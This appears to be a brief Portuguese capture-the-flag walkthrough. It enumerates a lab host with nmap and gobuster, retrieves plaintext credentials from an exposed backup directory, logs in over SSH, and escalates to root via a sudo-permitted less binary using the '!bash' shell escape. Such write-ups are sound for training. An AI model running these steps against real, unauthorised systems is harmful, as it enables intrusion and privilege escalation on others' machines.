## 🧠 

### 1️⃣ Enumeração

```bash
nmap -sC -sV IP
```

Resultado esperado:

* 22/tcp SSH
* 80/tcp HTTP

---

### 2️⃣ Enumeração Web

```bash
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
```

Descobre:

```
/backup
```

---

### 3️⃣ Credenciais expostas

```bash
curl http://IP/backup/creds.txt
```

```
student:student123
```

---

### 4️⃣ Acesso inicial

```bash
ssh student@IP
```

---

### 5️⃣ User flag

```bash
cat ~/user.txt
```

---

### 6️⃣ Enumeração local

```bash
sudo -l
```

Resultado:

```
(ALL) NOPASSWD: /usr/bin/less
```

---

### 7️⃣ Escalada (GTFOBins)

```bash
sudo less /etc/passwd
```

Dentro do `less`:

```text
!bash
```

---

### 8️⃣ Root flag

```bash
cat /root/root.txt
```

---
